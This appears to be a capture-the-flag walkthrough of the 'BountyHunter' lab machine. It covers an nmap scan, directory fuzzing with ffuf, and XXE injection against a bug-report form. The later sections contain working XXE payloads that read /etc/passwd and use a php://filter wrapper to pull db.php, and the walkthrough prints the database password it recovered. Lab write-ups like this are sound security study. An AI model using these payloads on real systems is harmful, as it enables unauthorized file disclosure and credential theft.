# BountyHunter

# Enumeration
---
### Nmap
#

TCP scan of all ports, including default scripts.

```bash
# Command
nmap -v -sS -sV -sC -T4 -p- -oA bountyhunter-full-tcp 10.129.95.166

# Results
Nmap scan report for 10.129.95.166
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 23 11:53:23 2024 -- 1 IP address (1 host up) scanned in 27.94 seconds
```

# HTTTP (Port 80)

Port 80 hosts a Bug Bounty submission page, browsing around there are a few stand out pages, such as a contact form which could be used for injection, however more interestingly a portal used for submitting bugs to the system. 

![image](https://github.com/user-attachments/assets/b08ce87c-dddc-4237-b0e3-6b0d70e71c5c)

A message is displayed on submission stating the DB isn't setup, however, the results are returned to the page. Not taking the comment at face value, I try some basic injection attacks including SQL but nothing works.

Some other paths were discovered using ffuf:

  Command line : `ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://bountyhunter/assets/FUZZ -t 2 -v -o ffuf-forced-browsing-directories -of md`

These were /assets and /resources. Whilst nothing of interest was found using assets, resources displayed a directory listing. I was unable to find anything sensitive but some of the files did help give an understanding of how the application was working, epecially the bounty submission form. 

When submitting the form the value is encoded using Base64 and URL encoding. 

```bash
# Enoded payload
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5hYTwvdGl0bGU%2BCgkJPGN3ZT5iYjwvY3dlPgoJCTxjdnNzPmNjPC9jdnNzPgoJCTxyZXdhcmQ%2BZGQ8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D

# Decoded Payload
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>Test</title>
		<cwe>101</cwe>
		<cvss>10</cvss>
		<reward>&names;</reward>
		</bugreport>
```

This is interesting because it is submitting XML to the server, I decided to try adding a basic XXE payload to the saubmision and re-encoding. The updated XML became:

```bash
# Updated XML
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE data [
		<!ENTITY names SYSTEM "/etc/passwd">
		]>
		<bugreport>
		<title>Test</title>
		<cwe>101</cwe>
		<cvss>10</cvss>
		<reward>&names;</reward>
		</bugreport>
```

After encoding and resubmitting, I was able to view the /etc/passwd file, see screenshot below:

![image](https://github.com/user-attachments/assets/032c3181-48ad-4604-9452-8de41cb168c5)

I could now start looking for more interesting data on the system. 

One file we target as this is php is the db.php file, we will need to base64 encode this in a PHP wrapper to avoid bad characters, see on Payload all the Things [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe).

The payload to get this ends up as:

```bash
# Payload to retrieve PHP file
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
  <cwe>test</cwe>
  <cvss>test</cvss>
  <reward>&file;</reward>
</bugreport>
```

Decoding the response we can see the dbpassword:

```bash
# dbpassword
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

